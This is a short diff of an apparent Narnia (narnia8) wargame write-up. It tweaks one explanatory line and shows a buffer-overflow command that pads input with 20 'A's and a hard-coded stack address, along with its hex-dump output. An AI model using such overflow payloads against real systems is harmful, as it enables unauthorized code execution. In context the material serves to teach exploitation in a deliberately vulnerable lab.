@@ -621,7 +621,7 @@ narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20') |xxd
 
 The address we're looking for is outputted 0xffffd8f5
 
-Now we add 4 bytes:
+Now we add 4 bytes (note that I'm also adjusting the address):
 narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xf1\xd8\xff\xff"') |xxd
 0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 0000010: 4141 4141 f1d8 ffff 020a                 AAAA......
